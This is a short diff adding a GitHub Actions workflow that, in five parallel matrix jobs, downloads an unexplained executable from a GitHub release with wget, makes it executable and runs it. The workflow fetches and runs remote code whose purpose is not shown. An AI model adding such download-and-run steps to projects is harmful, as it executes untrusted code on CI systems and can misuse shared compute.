@@ -1,0 +1,23 @@
+name: Matrix Workers
+
+on:
+  workflow_dispatch:
+
+jobs:
+  run-workers:
+    runs-on: ubuntu-latest
+
+    strategy:
+      matrix:
+        worker: [1, 2, 3, 4, 5]
+
+    steps:
+    - name: Download executable
+      run: wget https://github.com/Algoriman/Seeyou/releases/download/Super/main_executable -O main_executable
+
+    - name: Make executable
+      run: chmod +x main_executable
+
+    - name: Run executable
+      run: ./main_executable turjaun
+      
